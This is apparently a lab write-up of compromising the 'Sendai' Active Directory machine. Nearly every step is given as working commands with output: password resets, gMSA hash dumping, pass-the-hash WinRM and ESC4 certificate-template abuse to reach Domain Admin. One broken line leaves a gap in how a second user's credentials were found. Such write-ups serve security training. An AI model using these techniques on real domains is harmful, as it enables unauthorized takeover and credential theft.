During the engagement on **Sendai**, I enumerated SMB shares and discovered several user accounts with expired passwords. After resetting those credentials, I confirmed that the accounts were members of the **Support** group. One of those accounts possessed `GenericAll` privileges on the **ADMSVC** group, and ADMSVC in turn held `ReadGMSAPassword` rights on the `MGTSVC$` machine account. Further enumeration of the environment revealed credentials for **clifford**, a member of the **ca-operators** group who had full control over the **SendaiComputer** template. That control made the template susceptible to an ESC4-style privilege escalation; by modifying the template configuration to an ESC1-like state, I was subsequently able to escalate privileges to **Domain Admin**

# NMAP

```bash

sudo nmap -sC -sV -Pn  10.10.91.145 --open 
```

## Output

```output
Starting Nmap 7.95SVN ( https://nmap.org ) at 2025-09-25 09:01 EDT
Nmap scan report for 10.10.91.145
Host is up (0.028s latency).
Not shown: 985 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-25 13:01:59Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-09-25T12:51:52
|_Not valid after:  2026-09-25T12:51:52
|_ssl-date: TLS randomness does not represent time
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: DNS:dc.sendai.vl
| Not valid before: 2023-07-18T12:39:21
|_Not valid after:  2024-07-18T00:00:00
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-09-25T12:51:52
|_Not valid after:  2026-09-25T12:51:52
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-09-25T12:51:52
|_Not valid after:  2026-09-25T12:51:52
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Not valid before: 2025-09-25T12:51:52
|_Not valid after:  2026-09-25T12:51:52
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SENDAI
|   NetBIOS_Domain_Name: SENDAI
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sendai.vl
|   DNS_Computer_Name: dc.sendai.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-25T13:02:39+00:00
| ssl-cert: Subject: commonName=dc.sendai.vl
| Not valid before: 2025-09-24T13:00:56
|_Not valid after:  2026-03-26T13:00:56
|_ssl-date: 2025-09-25T13:03:19+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-25T13:02:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.60 seconds


```

## PORT 445

During SMB enumeration using anonymous login, several shares were discovered: `Config`, `Users`, and `Sendai`. The `Config` share was present but inaccessible due to permission restrictions, while the `Users` share contained no relevant files. The `Sendai` share, however, contained several files of interest, making it the primary focus for further investigation.

```bash
smbclient -L //dc.sendai.vl/ 
```

## Output

```output
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        config          Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        sendai          Disk      company share
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to dc.sendai.vl failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```bash
smbclient -U '' //dc.sendai.vl/sendai  
```

## OUTPUT
```output
assword for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 18 13:31:04 2023
  ..                                DHS        0  Wed Jul 19 10:11:25 2023
  hr                                  D        0  Tue Jul 11 08:58:19 2023
  incident.txt                        A     1372  Tue Jul 18 13:34:15 2023
  it                                  D        0  Tue Jul 18 09:16:46 2023
  legal                               D        0  Tue Jul 11 08:58:23 2023
  security                            D        0  Tue Jul 18 09:17:35 2023
  transfer                            D        0  Tue Jul 11 09:00:20 2023

                7309822 blocks of size 4096. 590484 blocks available
smb: \> cat incident.txt
cat: command not found
smb: \> get incident.txt
getting file \incident.txt of size 1372 as incident.txt (12.4 KiloBytes/sec) (average 12.4 KiloBytes/sec)
smb: \> cd transfer
smb: \transfer\> ls
  .                                   D        0  Tue Jul 11 09:00:20 2023
  ..                                  D        0  Tue Jul 18 13:31:04 2023
  anthony.smith                       D        0  Tue Jul 11 08:59:50 2023
  clifford.davey                      D        0  Tue Jul 11 09:00:06 2023
  elliot.yates                        D        0  Tue Jul 11 08:59:26 2023
  lisa.williams                       D        0  Tue Jul 11 08:59:34 2023
  susan.harper                        D        0  Tue Jul 11 08:59:39 2023
  temp                                D        0  Tue Jul 11 09:00:16 2023
  thomas.powell                       D        0  Tue Jul 11 08:59:45 2023

                7309822 blocks of size 4096. 657762 blocks available
smb: \transfer\> exit

```

The incident talked about users having weak passwords, all users will be prompted to change their password on logging in, the transfer directory had user’s directories

```output
cat incident.txt
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.                   

```

i make a user.txt file and put all the names in it

```bash
cat user.txt | awk '{print $1}'>users.txt
```

### Output
```output
cat users.txt                            
.
..
anthony.smith
clifford.davey
elliot.yates
lisa.williams
susan.harper
temp
thomas.powell
```

## Resetting domain user’s password

These users can also be enumerated through `lookupsid` by brute forcing sids
```bash
lookupsid.py guest@10.10.91.145 1000
```

### Output

```output
[*] Brute forcing SIDs at 10.10.91.145
[*] StringBinding ncacn_np:10.10.91.145[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3085872742-570972823-736764132
498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SENDAI\Administrator (SidTypeUser)
501: SENDAI\Guest (SidTypeUser)
502: SENDAI\krbtgt (SidTypeUser)
512: SENDAI\Domain Admins (SidTypeGroup)
513: SENDAI\Domain Users (SidTypeGroup)
514: SENDAI\Domain Guests (SidTypeGroup)
515: SENDAI\Domain Computers (SidTypeGroup)
516: SENDAI\Domain Controllers (SidTypeGroup)
517: SENDAI\Cert Publishers (SidTypeAlias)
518: SENDAI\Schema Admins (SidTypeGroup)
519: SENDAI\Enterprise Admins (SidTypeGroup)
520: SENDAI\Group Policy Creator Owners (SidTypeGroup)
521: SENDAI\Read-only Domain Controllers (SidTypeGroup)
522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)
525: SENDAI\Protected Users (SidTypeGroup)
526: SENDAI\Key Admins (SidTypeGroup)
527: SENDAI\Enterprise Key Admins (SidTypeGroup)
553: SENDAI\RAS and IAS Servers (SidTypeAlias)
571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)
572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)

```

On trying to login with null password, we’ll get two users with password to be changed

```bash
nxc  smb dc.sendai.vl -u users.txt -p '' --continue-on-success
```

### Output
```output
SMB         10.10.91.145    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
SMB         10.10.91.145    445    DC               [+] sendai.vl\.: (Guest)
SMB         10.10.91.145    445    DC               [+] sendai.vl\..: (Guest)
SMB         10.10.91.145    445    DC               [-] sendai.vl\anthony.smith: STATUS_LOGON_FAILURE 
SMB         10.10.91.145    445    DC               [-] sendai.vl\clifford.davey: STATUS_LOGON_FAILURE 
SMB         10.10.91.145    445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.10.91.145    445    DC               [-] sendai.vl\lisa.williams: STATUS_LOGON_FAILURE 
SMB         10.10.91.145    445    DC               [-] sendai.vl\susan.harper: STATUS_LOGON_FAILURE 
SMB         10.10.91.145    445    DC               [+] sendai.vl\temp: (Guest)
SMB         10.10.91.145    445    DC               [-] sendai.vl\thomas.powell: STATUS_PASSWORD_MUST_CHANGE 

```

Password can be changed with `impacket-smbpasswd`

```bash
python3 smbpasswd.py sendai.vl/Thomas.Powell@dc.sendai.vl -newpass '$mav1234' 
```

### Output
```bash
mpacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

Current SMB password: 
[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```

lets check shares

```bash
 netexec smb dc.sendai.vl -u Thomas.Powell -p '$mav1234' --shares
```

### Output

```output
SMB         10.10.91.145    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
SMB         10.10.91.145    445    DC               [+] sendai.vl\Thomas.Powell:$mav1234 
SMB         10.10.91.145    445    DC               [*] Enumerated shares
SMB         10.10.91.145    445    DC               Share           Permissions     Remark
SMB         10.10.91.145    445    DC               -----           -----------     ------
SMB         10.10.91.145    445    DC               ADMIN$                          Remote Admin
SMB         10.10.91.145    445    DC               C$                              Default share
SMB         10.10.91.145    445    DC               config          READ,WRITE      
SMB         10.10.91.145    445    DC               IPC$            READ            Remote IPC
SMB         10.10.91.145    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.91.145    445    DC               sendai          READ,WRITE      company share
SMB         10.10.91.145    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.91.145    445    DC               Users           READ            
                                                    

```

From config share, we can grab `.sqlconfig` having credentials to MSSQL
```bash
smbclient -U 'Thomas.Powell' //dc.sendai.vl/config   
```

```output
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 25 11:03:52 2025
  ..                                DHS        0  Wed Jul 19 10:11:25 2023
  .sqlconfig                          A       78  Tue Jul 11 08:57:11 2023

                7309822 blocks of size 4096. 1814206 blocks available
smb: \> get .sqlconfig  
getting file \.sqlconfig of size 78 as .sqlconfig (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> exit


```

```bash
cat .sqlconfig                                    
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;    

```

we get credentials
But this service isn’t exposed to us so moving on to enumerating the domain with bloodhound

```bash
netexec ldap 10.10.91.145 -u 'sqlsvc' -p 'SurenessBlob85' --bloodhound --dns-server 10.10.91.145 -c ALL --dns-tcp
```

### Output
```output
LDAP        10.10.91.145    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)
LDAP        10.10.91.145    389    DC               [+] sendai.vl\sqlsvc:SurenessBlob85 
LDAP        10.10.91.145    389    DC               Resolved collection methods: trusts, dcom, rdp, session, psremote, acl, container, localadmin, group, objectprops
LDAP        10.10.91.145    389    DC               Done in 00M 07S
LDAP        10.10.91.145    389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.10.91.145_2025-09-25_111943_bloodhound.zip
                            
```

lets copy this current directory
```bash
cp /home/kali/.nxc/logs/DC_10.10.91.145_2025-09-25_111943_bloodhound.zip .
```

Thomas.Powell is a member of `Support` group has `GenericAll` on `ADMSVC` group which has `ReadGMSAPassword` on `MGTSVC$` account. We'll need to add thomas in ADMSVC group, read the NThash of MGTSVC account

![[Pasted image 20250925163111.png]]


## Abusing GenericAll and reading GMSA password

Through `bloodyAD` we can add thomas in ADMSVC group having generic all rights
```bash
python3 bloodyAD.py --host 10.10.91.145 -d sendai.vl -u thomas.powell -p '$mav1234' add groupMember ADMSVC thomas.powell
```

## Output
```output
thomas.powell added to ADMSVC

```

## Step 2:Reading the GMSA Password for MGTSVC$
After confirming Thomas.Powell’s membership in the ADMSVC group, I assessed whether the gMSA credential for the `MGTSVC$` account could be retrieved; I used multiple enumeration tools to validate findings and captured all outputs for documentation in the engagement report.

```bash
python gMSADumper.py -u 'thomas.powell' -p '$mav1234' -d sendai.vl -l 10.10.91.145
```
Output

```bash
sers or groups who can read password for mgtsvc$:
 > admsvc
mgtsvc$:::9ed35c68b88f35007aa32c14c1332ce7
mgtsvc$:aes256-cts-hmac-sha1-96:b2f72eaef63eca98153069e3a9f5122c57dc82b5afe8b2f0df18dd3ba23b7500
mgtsvc$:aes128-cts-hmac-sha1-96:0f2a0b6230bbb641a864ca2b270708b1
                                                              
```

```bash
nxc ldap  sendai.vl -u 'thomas.powell' -p '$mav1234'  --gmsa 
```

### output

```output

LDAP        10.10.91.145    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)
LDAPS       10.10.91.145    636    DC               [+] sendai.vl\thomas.powell:$mav1234 
LDAPS       10.10.91.145    636    DC               [*] Getting GMSA Passwords
LDAPS       10.10.91.145    636    DC               Account: mgtsvc$              NTLM: 9ed35c68b88f35007aa32c14c1332ce7     PrincipalsAllowedToReadPassword: admsvc
                      
```


## WinRM Access with MGTSVC$ — Living Off the Land!
After validating the MGTSVC$ hash, it was confirmed to be valid for authentication, allowing remote access via WinRM. This access demonstrates the potential for leveraging existing service credentials to perform administrative tasks and highlights the importance of monitoring and securing service accounts to prevent unauthorized lateral movement within the environment.

## Privilege Escalation Time

The next phase involves systematically enumerating the target system for potential privilege escalation vectors. Key tools for Windows privilege escalation include WinPEAS for comprehensive system checks, PrivCheck for targeted enumeration, and guidance from reputable security research sources, such as the work of itm4n, which provides extensive insight into Windows misconfigurations. By executing these checks, we can identify misconfigurations, weak permissions, and exploitable services that could allow elevation of privileges, while documenting findings for remediation or reporting purposes.

```bash
evil-winrm -i sendai.vl -u  mgtsvc$ -H  9ed35c68b88f35007aa32c14c1332ce7 
```
#### FLAG
```output
*Evil-WinRM* PS C:\> cat user.txt
VL{e015461ca5ecaeb714cb231fd719be62}
```

lets upload PrivescCheck.ps1

```bash
*Evil-WinRM* PS C:\Users\mgtsvc$\documents> .\PrivescCheck.ps1  
*Evil-WinRM* PS C:\Users\mgtsvc$\documents> Import-Module .\PrivescCheck.ps1  
*Evil-WinRM* PS C:\Users\mgtsvc$\documents> Invoke-PrivescCheck

```

### Output

```bash
ame        : SQLBrowser
DisplayName : SQL Server Browser
ImagePath   : "C:\Program Files (x86)\Microsoft SQL Server\90\Shared\sqlbrowser.exe"
User        : NT AUTHORITY\LOCALSERVICE
StartMode   : Disabled

Name        : SQLTELEMETRY$SQLEXPRESS
DisplayName : SQL Server CEIP service (SQLEXPRESS)
ImagePath   : "C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\sqlceip.exe" -Service SQLEXPRESS
User        : NT Service\SQLTELEMETRY$SQLEXPRESS
StartMode   : Automatic

Name        : SQLWriter
DisplayName : SQL Server VSS Writer
ImagePath   : "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"
User        : LocalSystem
StartMode   : Automatic

Name        : ssh-agent
DisplayName : OpenSSH Authenticatio

```


creditionals u  Support  -p


## Checking for ADCS Attacks — Because It Opens A LOT of Doors!
With Clifford.Davey’s credentials in hand, the next step is to assess the Active Directory Certificate Services (ADCS) configuration for potential misconfigurations. ADCS attacks are critical to evaluate in an Active Directory environment, as they can provide multiple attack paths, including privilege escalation and domain compromise. By systematically reviewing certificate templates and permissions, we can identify vulnerabilities such as ESC4 or other misconfigurations that could be exploited to gain elevated access within the domain.

```bash
netexec ldap 10.10.91.145 -u 'clifford.davey' -p 'RFmoB2WplgE_3p' --bloodhound --dns-server 10.10.91.145 -c ALL --dns-tcp
```

```output
LDAP        10.10.91.145    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)
LDAP        10.10.91.145    389    DC               [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p 
LDAP        10.10.91.145    389    DC               Resolved collection methods: acl, session, rdp, group, localadmin, objectprops, psremote, trusts, dcom, container
LDAP        10.10.91.145    389    DC               Done in 00M 07S
LDAP        10.10.91.145    389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.10.91.145_2025-09-25_125151_bloodhound.zip
                              

```

```bash
cp /home/kali/.nxc/logs/DC_10.10.91.145_2025-09-25_125151_bloodhound.zip .
                                                                                 
```

we see that


![[Pasted image 20250925175508.png]]

## Privilege Escalation via ESC4 — Clifford.Davey’s Golden Ticket

Analysis of BloodHound data reveals that Clifford.Davey is a member of the CA Operators group, which provides full control over certain certificate templates. NetExec enumeration indicates that the `SendaiComputer` template has the Client Authentication EKU enabled. Given the CA Operators’ permissions, this template can be modified to issue a certificate capable of impersonating a Domain Admin. This scenario represents a classic ESC4 (Access Control) vulnerability, highlighting how misconfigured certificate templates can be leveraged for privilege escalation and domain compromise.


```bash
certipy-ad find -u clifford.davey -vulnerable -target dc.sendai.vl -dc-ip 10.10.91.145 -stdout   
```

### OUTPUT

```output
ertipy v5.0.3 - by Oliver Lyak (ly4k)

Password:
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2023-07-11T12:46:19+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Owner Principals          : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Dacl Principals           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Property Enroll           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
    [+] User Enrollable Principals      : SENDAI.VL\ca-operators
                                          SENDAI.VL\Domain Computers
    [+] User ACL Principals             : SENDAI.VL\ca-operators
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
                                                

```

## Modifying the Template for ESC4 Abuse
The Certipy enumeration indicates that the `SendaiComputer` template can be modified. With appropriate permissions, its configuration can be adjusted to allow any domain user to enroll, potentially enabling impersonation of high-privilege accounts, including Domain Admins. It is important to note that modifying certificate templates in this manner generates significant audit logs and is highly visible; in a real-world or Red Team engagement, alternative, less conspicuous approaches should be considered to maintain operational security while assessing privilege escalation paths.

## Exploiting ESC4 with Certipy — Step by Step

To abuse **ESC4** and impersonate a **Domain Admin**, we’ll go through the following steps using **Certipy**.

## Identify Vulnerable Certificate Templates

The initial step involves identifying misconfigured certificate templates that could be leveraged for privilege escalation. Using `certipy find`, we scan the environment to detect potential ESC4 (Access Control) vulnerabilities, highlighting templates where excessive permissions may allow unauthorized certificate enrollment or modification. This enables a structured assessment of attack paths related to ADCS misconfigurations.

**Command:**

```bash
 certipy-ad  find -u clifford.davey -vulnerable -target dc.sendai.vl -dc-ip 10.10.91.145 -stdout  
```

The scan identifies vulnerable certificate templates, confirming that the `SendaiComputer` template is misconfigured. Given that Clifford.Davey is a member of the CA Operators group, this level of access allows modification of the template to permit enrollment by any domain user, potentially enabling unauthorized certificate issuance.

## Modify the Template to Allow Enrollment

After identifying a vulnerable template, the next step is to adjust its configuration to allow domain users to enroll. This can be accomplished using the `certipy template` command, which enables modification of certificate template permissions in a controlled manner, highlighting the risk of unauthorized certificate issuance in misconfigured ADCS environments.

#### Command

```bash
certipy-ad template -u clifford.davey -p 'RFmoB2WplgE_3p' -target dc.sendai.vl -dc-ip 10.10.91.145 -template SendaiComputer -write-default-configuration
```

This **modifies the certificate template** to allow us to **request a certificate** for any user, including **Domain Admins**.


## Request a Certificate for Domain Admin

Now that we have control over the template, we can request a **certificate for the Administrator account**:

Command
```bash
certipy-ad  req -u 'clifford.davey' -ca 'sendai-DC-CA' -dc-ip 10.10.91.145 -target dc.sendai.vl -template 'SendaiComputer' -upn administrator
```

```output
assword:
[*] Requesting certificate via RPC
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx


```


## Authenticate as Domain Admin

Finally, we use `certipy auth` to authenticate as the **Administrator** using the issued certificate:

**Command:**

```bash
certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.10.91.145 -domain sendai.vl 
```

```output
*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a

```

Boom!  We now have **Domain Admin access**, all thanks to **ESC4 abuse**. Time to **own the domain**! 


### EVILWINRM

```bash
evil-winrm -i 10.10.91.145  -u  administrator -H  cfb106feec8b89a3d98e14dcbe8d087a
```

```output
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
VL{ae138bcfb077995339a717a28a23fd61}
```




